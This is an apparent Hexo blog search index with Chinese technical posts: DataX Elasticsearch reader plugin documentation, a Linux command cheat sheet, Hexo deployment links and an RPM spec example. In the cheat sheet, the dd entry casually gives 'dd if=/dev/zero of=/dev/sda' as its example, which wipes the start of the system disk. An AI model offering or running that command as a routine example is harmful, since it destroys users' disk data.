<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>elasticsearchreader</title>
      <link href="/2024/02/26/elasticsearchreader/"/>
      <url>/2024/02/26/elasticsearchreader/</url>
      
        <content type="html"><![CDATA[<h3 id="1-快速介绍"><a href="#1-快速介绍" class="headerlink" title="1 快速介绍"></a>1 <a href="https://github.com/huhuhuHR/DataX/blob/dev/elasticsearchreader/doc/elasticsearchreader.md">快速介绍</a></h3><p>Elasticsearch Scroll API 是一项突破性的技术解决方案，专为高效处理大数据集而设计。</p><p>相较于传统的分页查询机制，Scroll API 能够克服其在数据量庞大时性能下降、资源消耗增大的局限性。</p><p>在DataX数据迁移场景中，ElasticsearchReader巧妙地运用了Scroll API的全量检索能力，通过一次性设定恰当的查询语句，能够无缝遍历并抽取指定索引下的所有数据记录。</p><p>在此过程中，ElasticsearchReader会将获取到的海量原始数据实时且高效地转化为符合DataX传输规范的数据格式，进而确保Writer组件能够流畅接收与处理这些数据，实现大规模数据在不同系统间的快速迁移和同步。</p><h3 id="2-功能与限制"><a href="#2-功能与限制" class="headerlink" title="2 功能与限制"></a>2 功能与限制</h3><p>基于Elasticsearch的Scroll API，ElasticsearchReader实现了以下功能。</p><p>得益于Elasticsearch的Scroll API，ElasticsearchReader高效实现了以下核心功能：</p><p>1.全量数据精确抓取：通过精心设计的query语句，ElasticsearchReader利用Scroll API的独特优势，能够一次性从指定索引中检索并获取全部相关数据，从而克服了传统分页查询在处理大量数据时的性能瓶颈。</p><p>3.高效数据流处理：ElasticsearchReader借助Scroll API的持久化游标机制，实现了一种持续、流畅的数据流读取方式。这不仅减少了网络开销，还确保了在处理大量数据时系统的稳定性和响应速度。</p><p>4.资源管理优化：通过 Scroll API 的上下文管理，ElasticsearchReader能够有效控制和清理检索过程中的临时资源，避免了因长时间执行查询而可能导致的系统资源浪费或堆积问题。</p><p>5.与DataX生态无缝集成：将从Elasticsearch获取到的全量数据转换为DataX传输协议格式后，ElasticsearchReader可直接与DataX生态下的Writer组件对接，实现了跨系统的高效数据迁移和同步任务。</p><p>我们暂时不能做到：</p><ol><li><p>增量查询数据。原因：<br>在Elasticsearch中，当使用Scroll API进行深度分页或批量检索数据时，它所基于的“快照”并非传统意义上的数据库备份快照，而是指Scroll API在首次执行搜索请求时获取的一次性索引视图。</p></li><li><p>考虑到稳定性，elasticsearchreader采用单线程工作方式。</p></li><li><p>考虑到配置大于约定的原则，不动态mapping映射数据结构，最大的基于配置灵活性。</p></li></ol><p>这个视图包含当前搜索请求定义下所有匹配文档的一个静态集合。</p><p>具体来说：</p><ul><li><p>a. 初始化Scroll：当你发起一个带有scroll参数的搜索请求时，Elasticsearch会冻结当前索引的状态，并为此次搜索创建一个上下文（context）。</p></li><li><p>b. 快照视图：这个上下文包含了满足搜索条件的所有文档的一个瞬时视图，可以理解为对索引状态的一个“快照”。这意味着在这个快照生成后，即使索引中的文档发生增删改等变化，Scroll API后续返回的结果也不会受到这些变更的影响。</p></li><li><p>c. 滚动查询：在首次搜索之后，你可以通过发送带有先前响应中返回的scroll ID的请求来继续滚动查询。每次滚动都会从快照视图中返回下一批文档，直到所有文档都被遍历完毕或者scroll超时。</p></li></ul><p>因此，对于Scroll API而言，“快照”意味着一次搜索请求结果集的固定版本，它不支持增量更新和实时变化的数据同步。这种设计允许用户在一段时间内处理大量数据而不用担心在此期间索引数据的变动问题。</p><h3 id="3-功能说明"><a href="#3-功能说明" class="headerlink" title="3 功能说明"></a>3 功能说明</h3><p>全量查询Elasticsearch某索引的所有数据,适合全量同步数据，适用于大量数据的迁移场景。</p><h4 id="3-1-配置样例"><a href="#3-1-配置样例" class="headerlink" title="3.1 配置样例"></a>3.1 配置样例</h4><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"setting"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"job"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"setting"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"speed"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"channel"</span><span class="token operator">:</span> <span class="token number">2</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        <span class="token property">"reader"</span><span class="token operator">:</span> <span class="token punctuation">{</span>          <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"elasticsearchreader"</span><span class="token punctuation">,</span>          <span class="token property">"parameter"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"hosts"</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1:9200"</span><span class="token punctuation">,</span>            <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token property">"connection_timeout"</span><span class="token operator">:</span> <span class="token string">"10000"</span><span class="token punctuation">,</span>            <span class="token property">"socket_timeout"</span><span class="token operator">:</span> <span class="token string">"60000"</span><span class="token punctuation">,</span>            <span class="token property">"io_thread_count"</span><span class="token operator">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span>            <span class="token property">"index"</span><span class="token operator">:</span> <span class="token string">"abc-*"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"_doc"</span><span class="token punctuation">,</span>            <span class="token property">"scroll"</span><span class="token operator">:</span> <span class="token string">"10m"</span><span class="token punctuation">,</span>            <span class="token property">"size"</span><span class="token operator">:</span> <span class="token number">100</span><span class="token punctuation">,</span>            <span class="token property">"dsl"</span><span class="token operator">:</span> <span class="token punctuation">{</span>              <span class="token property">"query"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                <span class="token property">"term"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                  <span class="token property">"field1"</span><span class="token operator">:</span> <span class="token punctuation">{</span>                    <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"1"</span>                  <span class="token punctuation">}</span>                <span class="token punctuation">}</span>              <span class="token punctuation">}</span><span class="token punctuation">,</span>              <span class="token property">"_source"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"field1"</span>              <span class="token punctuation">]</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"column"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">{</span>                <span class="token property">"field"</span><span class="token operator">:</span> <span class="token string">"field1"</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>                <span class="token property">"defaultValue"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>                <span class="token property">"dataFormat"</span><span class="token operator">:</span> <span class="token string">""</span>              <span class="token punctuation">}</span>            <span class="token punctuation">]</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"writer"</span><span class="token operator">:</span> <span class="token punctuation">{</span>          <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"streamwriter"</span><span class="token punctuation">,</span>          <span class="token property">"parameter"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"encoding"</span><span class="token operator">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>            <span class="token property">"print"</span><span class="token operator">:</span> <span class="token boolean">true</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-参数说明"><a href="#3-2-参数说明" class="headerlink" title="3.2 参数说明"></a>3.2 参数说明</h4><ul><li><strong>hosts</strong></li></ul><ul><li><p><strong>描述</strong>：Elasticsearch服务的访问地址列表。多个地址之间使用英文逗号分隔。</p></li><li><p><strong>必选</strong>：是</p></li><li><p><strong>默认值</strong>：无</p></li></ul><ul><li><strong>username</strong></li></ul><ul><li><p><strong>描述</strong>：用于连接Elasticsearch集群的HTTP基本认证用户名。如果集群启用了身份验证，则需要提供此信息。</p></li><li><p><strong>必选</strong>：视情况而定（取决于集群是否要求身份验证）</p></li><li><p><strong>默认值</strong>：空字符串</p></li></ul><ul><li><strong>password</strong></li></ul><ul><li><p><strong>描述</strong>：与<code>username</code>对应的HTTP基本认证密码。</p></li><li><p><strong>必选</strong>：视情况而定（同上，取决于集群是否要求密码认证）</p></li><li><p><strong>默认值</strong>：空字符串</p></li></ul><ul><li><strong>connection_timeout</strong></li></ul><ul><li><p><strong>描述</strong>：客户端尝试连接到Elasticsearch服务器的超时时间（单位：毫秒）。</p></li><li><p><strong>必选</strong>：否</p></li><li><p><strong>默认值</strong>：10000毫秒（即10秒）</p></li></ul><ul><li><strong>socket_timeout</strong></li></ul><ul><li><p><strong>描述</strong>：客户端与Elasticsearch服务器之间的网络读写操作超时时间（单位：毫秒）。</p></li><li><p><strong>必选</strong>：否</p></li><li><p><strong>默认值</strong>：60000毫秒（即1分钟）</p></li></ul><ul><li><strong>io_thread_count</strong></li></ul><ul><li><p><strong>描述</strong>：用于处理与Elasticsearch服务器网络I/O操作的线程数。</p></li><li><p><strong>必选</strong>：否</p></li><li><p><strong>默认值</strong>：5个线程</p></li></ul><ul><li><strong>index</strong></li></ul><ul><li><p><strong>描述</strong>：满足elasticsearch索引检索规则。</p><ul><li><p>单个索引名称： 指定要在其中搜索的单个索引名称。例如：”index”: “my_index”。</p></li><li><p>逗号分隔的多个索引名称： 可以指定逗号分隔的多个索引名称，以在这些索引中执行搜索。例如：”index”: “index1,index2”。</p></li><li><p>通配符表达式： 可以使用通配符表达式来匹配多个索引名称。常用的通配符包括<em>和?。例如：”index”: “prefix</em>“或”index”: “prefix?,suffix*”。</p></li><li><p>索引模式匹配： 除了通配符表达式外，还可以使用索引模式来匹配索引名称。例如，使用&lt;index-{now/d}&gt;<br>这样的模式可以匹配形如index-2024-02-26的索引名称，其中{now/d}是一个时间格式的占位符，表示当天的日期。</p></li><li><p>索引别名： 除了直接指定索引名称外，还可以指定索引别名，搜索将在该别名所关联的索引上执行。例如：”index”: “my_alias”。</p></li></ul></li><li><p><strong>必选</strong>：是（在执行索引相关操作时）</p></li><li><p><strong>默认值</strong>：无</p></li></ul><ul><li><strong>type</strong></li></ul><ul><li><p><strong>描述</strong>：在旧版本Elasticsearch中代表文档类型的字段，在7.x及以上版本已弃用，默认为”_doc”。</p></li><li><p><strong>必选</strong>：视情况而定（对于兼容旧版Elasticsearch的情况）</p></li><li><p><strong>默认值</strong>：”_doc”</p></li></ul><ul><li><strong>scroll</strong></li></ul><ul><li><p><strong>描述</strong>：Scroll API的保持存活时间，在这个时间段内可以持续滚动获取更多数据（单位：分钟）。</p></li><li><p><strong>必选</strong>：当使用Scroll API时必需</p></li><li><p><strong>默认值</strong>：根据设置（此处设定为 “10m” 即10分钟）</p></li></ul><ul><li><strong>size</strong></li></ul><ul><li><p><strong>描述</strong>：每次Scroll请求返回的结果集大小，即一次获取多少条文档记录。</p></li><li><p><strong>必选</strong>：在使用Scroll API时通常需要设置</p></li><li><p><strong>默认值</strong>：根据上下文需求决定（此处设定了 “100” 条记录）</p></li></ul><ul><li><strong>dsl</strong></li></ul><ul><li><p><strong>描述</strong>：包含Elasticsearch查询DSL（Domain Specific Language）的JSON对象，用于定义复杂的搜索和过滤条件。</p></li><li><p><strong>必选</strong>：当需要执行特定查询时必需,并且包含query和_source。</p></li><li><p><strong>默认值</strong>：无（此处给出了一个示例查询）</p></li></ul><ul><li><strong>column</strong></li></ul><ul><li><strong>描述</strong>：字段映射</li></ul><pre class="line-numbers language-none"><code class="language-none">{  "field": "field1",  "type": "int/long/double/date/bool/string",  "defaultValue": "默认值",  "dataFormat": "时间格式"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>type类型支持int,long,double,date,bool,string,大小写不敏感。是data类型的时候需要指定dataFormat.</p><p>Java中常见的日期格式主要包括以下几种：</p><ul><li>完整日期时间（包括年月日时分秒）：</li></ul><p>yyyy-MM-dd HH:mm:ss：表示四位数的年、两位数的月和日，24小时制的小时、分钟和秒。例如：2024-02-26 14:30:45。</p><p>yyyy-MM-dd hh:mm:ss a 或 yyyy-MM-dd HH:mm:ss a：与上面类似，但添加了AM/PM指示符区分上午和下午，其中hh是12小时制小时数。</p><ul><li>仅日期部分：</li></ul><p>yyyy-MM-dd：只包含年月日信息，不包含时间。例如：2024-02-26。</p><ul><li>仅时间部分：</li></ul><p>HH:mm:ss：24小时制的时间，不包含日期。例如：14:30:45。</p><p>hh:mm:ss a：12小时制的时间，并带有AM/PM标记。</p><ul><li>精确到毫秒：</li></ul><p>yyyy-MM-dd HH:mm:ss.SSS：表示日期时间至毫秒级别，例如：2024-02-26 14:30:45.123。</p><p>Java 8中的Java.time包支持更精细的时间格式：</p><p>yyyy-MM-dd HH:mm:ss.SSSSSS：使用java.time.LocalDateTime和DateTimeFormatter可以达到微秒级别的格式化，但实际上Java获取的是系统当前时间的毫秒数，微秒部分补零。</p><ul><li><p><strong>必选</strong>：和_soured字段映射</p></li><li><p><strong>默认值</strong>：无</p></li></ul><h4 id="3-3-类型转换"><a href="#3-3-类型转换" class="headerlink" title="3.3 类型转换"></a>3.3 类型转换</h4><p>Datax的数据结构包括：BAD, NULL, INT, LONG, DOUBLE, STRING, BOOL, DATE, BYTES。<br>Elasticsearch Mapping 类型及其可能的DataX映射：</p><ol><li><p><strong>文本（Text）</strong></p><ul><li>对应DataX：字符串类型（String）</li></ul></li><li><p><strong>关键字（Keyword）</strong></p><ul><li>对应DataX：字符串类型（String），适用于索引和排序的精确值场景。</li></ul></li><li><p><strong>整数（Integer）</strong></p><ul><li><code>byte</code>, <code>short</code>, <code>integer</code>, <code>long</code></li><li>对应DataX：整数类型（LONG）</li></ul></li><li><p><strong>浮点数（Floating Point）</strong></p><ul><li><code>float</code>, <code>double</code></li><li>对应DataX：浮点数类型（Double）</li></ul></li><li><p><strong>日期（Date）</strong></p><ul><li>对应DataX：日期类型（Date）</li></ul></li><li><p><strong>布尔（Boolean）</strong></p><ul><li>对应DataX：布尔类型（Boolean）</li></ul></li><li><p><strong>二进制（Binary）</strong></p><ul><li>对应DataX：通常通过Base64编码转换为字符串传输，因此在DataX中可以表现为字符串类型（String）</li></ul></li><li><p><strong>数组（Array）</strong></p><ul><li>对应DataX：字符串类型（String）</li></ul></li><li><p><strong>地理位置（Geo-point）</strong></p><ul><li>对应DataX：可以转换为经纬度坐标对字符串类型（String）</li></ul></li><li><p><strong>嵌套对象（Nested Object）</strong></p><ul><li>对应DataX：复杂类型，通常需要转换为JSON字符串或其他可序列化的结构，在DataX中用字符串类型（String）<h3 id="插件地址"><a href="#插件地址" class="headerlink" title="插件地址"></a>插件地址</h3>链接：<a href="https://pan.baidu.com/s/1nF1SBOwlBBvQ-UF7_EWHww">https://pan.baidu.com/s/1nF1SBOwlBBvQ-UF7_EWHww</a><br>提取码：pgwk</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> datax </category>
          
      </categories>
      
      
        <tags>
            
            <tag> datax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux性能实战</title>
      <link href="/2024/02/20/linux-xing-neng-shi-zhan/"/>
      <url>/2024/02/20/linux-xing-neng-shi-zhan/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-cmd</title>
      <link href="/2024/02/15/linux-cmd/"/>
      <url>/2024/02/15/linux-cmd/</url>
      
        <content type="html"><![CDATA[<h2 id="cd："><a href="#cd：" class="headerlink" title="cd："></a>cd：</h2><pre><code>功能：切换当前工作目录。用法：cd [目录路径]示例：cd /home/user</code></pre><h2 id="ls："><a href="#ls：" class="headerlink" title="ls："></a>ls：</h2><pre><code>功能：列出目录内容。用法：ls [选项] [文件/目录]示例：ls -l /home/user</code></pre><h2 id="pwd："><a href="#pwd：" class="headerlink" title="pwd："></a>pwd：</h2><pre><code>功能：显示当前工作目录的绝对路径。用法：pwd示例：pwd</code></pre><h2 id="clear："><a href="#clear：" class="headerlink" title="clear："></a>clear：</h2><pre><code>功能：清除终端屏幕上的内容。用法：clear示例：clear</code></pre><h2 id="chmod："><a href="#chmod：" class="headerlink" title="chmod："></a>chmod：</h2><pre><code>功能：修改文件或目录的权限。用法：chmod [选项] 模式 文件/目录示例：chmod +x script.sh</code></pre><h2 id="chown："><a href="#chown：" class="headerlink" title="chown："></a>chown：</h2><pre><code>功能：修改文件或目录的所有者和/或所属组。用法：chown [选项] 用户:组 文件/目录示例：chown user:group file.txt</code></pre><h2 id="chattr："><a href="#chattr：" class="headerlink" title="chattr："></a>chattr：</h2><pre><code>功能：改变文件系统对象的属性。用法：chattr [选项] 文件示例：chattr +i file.txt</code></pre><h2 id="useradd："><a href="#useradd：" class="headerlink" title="useradd："></a>useradd：</h2><pre><code>功能：添加新用户。用法：useradd [选项] 用户名示例：useradd -m user</code></pre><h2 id="userdel："><a href="#userdel：" class="headerlink" title="userdel："></a>userdel：</h2><pre><code>功能：删除用户。用法：userdel [选项] 用户名示例：userdel user</code></pre><h2 id="groupadd："><a href="#groupadd：" class="headerlink" title="groupadd："></a>groupadd：</h2><pre><code>功能：添加新用户组。用法：groupadd [选项] 组名示例：groupadd group</code></pre><h2 id="vi-vim："><a href="#vi-vim：" class="headerlink" title="vi/vim："></a>vi/vim：</h2><pre><code>功能：文本编辑器。用法：vi/vim [文件]示例：vim file.txt</code></pre><h2 id="cat："><a href="#cat：" class="headerlink" title="cat："></a>cat：</h2><pre><code>功能：连接文件并打印到标准输出。用法：cat [选项] 文件示例：cat file.txt</code></pre><h2 id="more："><a href="#more：" class="headerlink" title="more："></a>more：</h2><pre><code>功能：分屏显示文件内容。用法：more [选项] 文件示例：more file.txt</code></pre><h2 id="less："><a href="#less：" class="headerlink" title="less："></a>less：</h2><pre><code>功能：分页查看文件内容。用法：less [选项] 文件示例：less file.txt</code></pre><h2 id="mv："><a href="#mv：" class="headerlink" title="mv："></a>mv：</h2><pre><code>功能：移动/重命名文件或目录。用法：mv [选项] 源文件/目录 目标文件/目录示例：mv file.txt new_location/file.txt</code></pre><h2 id="cp："><a href="#cp：" class="headerlink" title="cp："></a>cp：</h2><pre><code>功能：复制文件或目录。用法：cp [选项] 源文件/目录 目标文件/目录示例：cp file.txt backup/file.txt</code></pre><h2 id="rm："><a href="#rm：" class="headerlink" title="rm："></a>rm：</h2><pre><code>功能：删除文件或目录。用法：rm [选项] 文件/目录示例：rm file.txt</code></pre><h2 id="touch："><a href="#touch：" class="headerlink" title="touch："></a>touch：</h2><pre><code>功能：创建空文件或更改文件的时间戳。用法：touch [选项] 文件示例：touch new_file.txt</code></pre><h2 id="ifconfig-ip-addr："><a href="#ifconfig-ip-addr：" class="headerlink" title="ifconfig/ip addr："></a>ifconfig/ip addr：</h2><pre><code>功能：显示和配置网络接口信息。用法：ifconfig/ip addr示例：ifconfig</code></pre><h2 id="ping："><a href="#ping：" class="headerlink" title="ping："></a>ping：</h2><pre><code>功能：向网络主机发送ICMP ECHO_REQUEST消息。用法：ping [选项] 目标地址示例：ping google.com</code></pre><h2 id="route："><a href="#route：" class="headerlink" title="route："></a>route：</h2><pre><code>功能：显示和操作路由表。用法：route [选项]示例：route -n</code></pre><h2 id="echo："><a href="#echo：" class="headerlink" title="echo："></a>echo：</h2><pre><code>功能：打印文本。用法：echo [选项] 文本示例：echo "Hello, world!"</code></pre><h2 id="wc："><a href="#wc：" class="headerlink" title="wc："></a>wc：</h2><pre><code>功能：统计文件中的行数、字数和字符数。用法：wc [选项] 文件示例：wc -l file.txt</code></pre><h2 id="expr："><a href="#expr：" class="headerlink" title="expr："></a>expr：</h2><pre><code>功能：进行算术运算和字符串处理。用法：expr [选项] 表达式示例：expr 2 + 2</code></pre><h2 id="bc："><a href="#bc：" class="headerlink" title="bc："></a>bc：</h2><pre><code>功能：进行高精度计算。用法：bc [选项]示例：echo "3 * 4" | bc</code></pre><h2 id="ln："><a href="#ln：" class="headerlink" title="ln："></a>ln：</h2><pre><code>功能：创建链接文件。用法：ln [选项] 源文件 链接文件示例：ln -s file.txt link.txt</code></pre><h2 id="head："><a href="#head：" class="headerlink" title="head："></a>head：</h2><pre><code>功能：显示文件的开头部分。用法：head [选项] 文件示例：head -n 5 file.txt</code></pre><h2 id="tail："><a href="#tail：" class="headerlink" title="tail："></a>tail：</h2><pre><code>功能：显示文件的末尾部分。用法：tail [选项] 文件示例：tail -n 5 file.txt</code></pre><h2 id="who："><a href="#who：" class="headerlink" title="who："></a>who：</h2><pre><code>功能：显示当前登录的用户信息。用法：who [选项]示例：who</code></pre><h2 id="hostname："><a href="#hostname：" class="headerlink" title="hostname："></a>hostname：</h2><pre><code>功能：显示或设置系统主机名。用法：hostname [选项]示例：hostname</code></pre><h2 id="top："><a href="#top：" class="headerlink" title="top："></a>top：</h2><pre><code>功能：显示系统中运行的进程信息。用法：top [选项]示例：top</code></pre><h2 id="df："><a href="#df：" class="headerlink" title="df："></a>df：</h2><pre><code>功能：显示磁盘分区使用情况。用法：df [选项]示例：df -h</code></pre><h2 id="du："><a href="#du：" class="headerlink" title="du："></a>du：</h2><pre><code>功能：显示文件和目录的磁盘使用情况。用法：du [选项] 文件/目录示例：du -sh directory</code></pre><h2 id="netstat-ss："><a href="#netstat-ss：" class="headerlink" title="netstat/ss："></a>netstat/ss：</h2><pre><code>功能：显示网络连接、路由表和接口信息。用法：netstat/ss [选项]示例：netstat -tuln</code></pre><h2 id="kill："><a href="#kill：" class="headerlink" title="kill："></a>kill：</h2><pre><code>功能：终止进程。用法：kill [选项] 进程号示例：kill -9 PID</code></pre><h2 id="alias："><a href="#alias：" class="headerlink" title="alias："></a>alias：</h2><pre><code>功能：创建命令别名。用法：alias [别名]='原始命令'示例：alias ll='ls -l'</code></pre><h2 id="man："><a href="#man：" class="headerlink" title="man："></a>man：</h2><pre><code>功能：显示命令的使用手册。用法：man [命令]示例：man ls</code></pre><h2 id="tar："><a href="#tar：" class="headerlink" title="tar："></a>tar：</h2><pre><code>功能：打包和解压文件。用法：tar [选项] 文件/目录示例：tar -czvf archive.tar.gz directory</code></pre><h2 id="zip-unzip："><a href="#zip-unzip：" class="headerlink" title="zip/unzip："></a>zip/unzip：</h2><pre><code>功能：压缩和解压ZIP文件。用法：zip/unzip [选项] 文件/目录示例：zip -r archive.zip directory</code></pre><h2 id="jar："><a href="#jar：" class="headerlink" title="jar："></a>jar：</h2><pre><code>功能：创建和解压Java归档文件。用法：jar [选项]示例：jar cvf myjar.jar files</code></pre><h2 id="fdisk："><a href="#fdisk：" class="headerlink" title="fdisk："></a>fdisk：</h2><pre><code>功能：磁盘分区工具。用法：fdisk [选项] 磁盘设备示例：fdisk -l /dev/sda</code></pre><h2 id="free："><a href="#free：" class="headerlink" title="free："></a>free：</h2><pre><code>功能：显示系统内存使用情况。用法：free [选项]示例：free -h</code></pre><h2 id="uptime："><a href="#uptime：" class="headerlink" title="uptime："></a>uptime：</h2><pre><code>功能：显示系统的运行时间和平均负载。用法：uptime示例：uptime</code></pre><h2 id="lsof："><a href="#lsof：" class="headerlink" title="lsof："></a>lsof：</h2><pre><code>功能：显示打开文件的进程。用法：lsof [选项]示例：lsof -i</code></pre><h2 id="lsmod："><a href="#lsmod：" class="headerlink" title="lsmod："></a>lsmod：</h2><pre><code>功能：显示内核加载的模块。用法：lsmod示例：lsmod</code></pre><h2 id="lsattr："><a href="#lsattr：" class="headerlink" title="lsattr："></a>lsattr：</h2><pre><code>功能：显示文件的扩展属性。用法：lsattr [选项] 文件示例：lsattr file.txt</code></pre><h2 id="dd："><a href="#dd：" class="headerlink" title="dd："></a>dd：</h2><pre><code>功能：数据转换和备份工具。用法：dd [选项]示例：dd if=/dev/zero of=/dev/sda bs=1M count=1</code></pre><h2 id="date："><a href="#date：" class="headerlink" title="date："></a>date：</h2><pre><code>功能：显示和设置系统时间。用法：date [选项]示例：date</code></pre><h2 id="crontab："><a href="#crontab：" class="headerlink" title="crontab："></a>crontab：</h2><pre><code>功能：定时执行任务。用法：crontab [选项]示例：crontab -e</code></pre><h2 id="ps："><a href="#ps：" class="headerlink" title="ps："></a>ps：</h2><pre><code>功能：显示进程状态。用法：ps [选项]示例：ps aux</code></pre><h2 id="find："><a href="#find：" class="headerlink" title="find："></a>find：</h2><pre><code>功能：搜索文件。用法：find [路径] [选项]示例：find /home -name "*.txt"</code></pre><h2 id="awk："><a href="#awk：" class="headerlink" title="awk："></a>awk：</h2><pre><code>功能：处理文本数据。用法：awk 'pattern { action }' 文件示例：awk '{ print $1 }' file.txt</code></pre><h2 id="sed："><a href="#sed：" class="headerlink" title="sed："></a>sed：</h2><pre><code>功能：流编辑器，用于文本处理。用法：sed 'COMMAND' 文件示例：sed 's/apple/orange/' file.txt</code></pre><h2 id="grep："><a href="#grep：" class="headerlink" title="grep："></a>grep：</h2><pre><code>功能：搜索文本。用法：grep [选项] 模式 文件示例：grep "pattern" file.txt</code></pre><h2 id="sort："><a href="#sort：" class="headerlink" title="sort："></a>sort：</h2><pre><code>功能：对文本进行排序。用法：sort [选项] 文件示例：sort file.txt</code></pre><h2 id="uniq："><a href="#uniq：" class="headerlink" title="uniq："></a>uniq：</h2><pre><code>功能：过滤文本中的重复行。用法：uniq [选项] 文件示例：uniq file.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Actions实现自动化部署Hexo博客</title>
      <link href="/2024/02/06/actions-shi-xian-zi-dong-hua-bu-shu-hexo-bo-ke/"/>
      <url>/2024/02/06/actions-shi-xian-zi-dong-hua-bu-shu-hexo-bo-ke/</url>
      
        <content type="html"><![CDATA[<h2 id="HEXO搭建博客-Actions实现自动化部署Hexo博客"><a href="#HEXO搭建博客-Actions实现自动化部署Hexo博客" class="headerlink" title="HEXO搭建博客+Actions实现自动化部署Hexo博客"></a>HEXO搭建博客+Actions实现自动化部署Hexo博客</h2><p><a href="https://huhuhuhr.github.io/2021/08/21/hello-world/">HEXO搭建博客</a><br><a href="https://huhuhuhr.github.io/2021/08/26/hexo-image-show/">HEXO图片不展示问题解决</a><br><a href="https://xiaoborao.github.io/2021/12/25/github-hexo/#more">Github Actions实现自动化部署Hexo博客</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rpmbuild</title>
      <link href="/2024/01/21/rpmbuild/"/>
      <url>/2024/01/21/rpmbuild/</url>
      
        <content type="html"><![CDATA[<h1 id="构建脚本例子"><a href="#构建脚本例子" class="headerlink" title="构建脚本例子"></a>构建脚本例子</h1><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Name:     demo-toolsVersion:  <span class="token number">1.0</span>.0Release:  <span class="token number">1</span>Summary:  demo shell toolsGroup:    Applications/SystemLicense:  GPLURL:      http://www.zhongfu.netBuildRoot:%<span class="token punctuation">{</span>_builddir<span class="token punctuation">}</span>/%<span class="token punctuation">{</span>name<span class="token punctuation">}</span>-rootBuildArch:noarchAutoReqProv: noSource0:  %<span class="token punctuation">{</span>name<span class="token punctuation">}</span>.tar.gz%define __os_install_post %<span class="token punctuation">{</span>nil<span class="token punctuation">}</span>%descriptiondemo运维脚本工具%prep%setup -n %<span class="token punctuation">{</span>name<span class="token punctuation">}</span>%install<span class="token function">mkdir</span> -p <span class="token variable">$RPM_BUILD_ROOT</span><span class="token function">mkdir</span> -p %<span class="token punctuation">{</span>buildroot<span class="token punctuation">}</span>/opt/github/demo-tools/bin/cp -rf <span class="token variable">$RPM_BUILD_DIR</span>/%<span class="token punctuation">{</span>name<span class="token punctuation">}</span>/*  <span class="token variable">$RPM_BUILD_ROOT</span>/opt/github/demo-tools/%post<span class="token function">chown</span> -R root:root /opt/github/demo-tools<span class="token function">chmod</span> +755 /opt/github/demo-tools/*.sh%preun%postun<span class="token keyword">if</span> <span class="token punctuation">[</span> -d <span class="token string">"/opt/github/demo-tools"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>   <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$1</span> <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>     <span class="token function">rm</span> -rf /opt/github/demo-tools   <span class="token keyword">fi</span><span class="token keyword">fi</span>%clean<span class="token function">rm</span> -rf <span class="token variable">$RPM_BUILD_ROOT</span>%files%defattr<span class="token punctuation">(</span>-,root,root,-<span class="token punctuation">)</span>    /opt/github/demo-tools/*%changelog* Sun Jan <span class="token number">21</span> <span class="token number">2024</span> 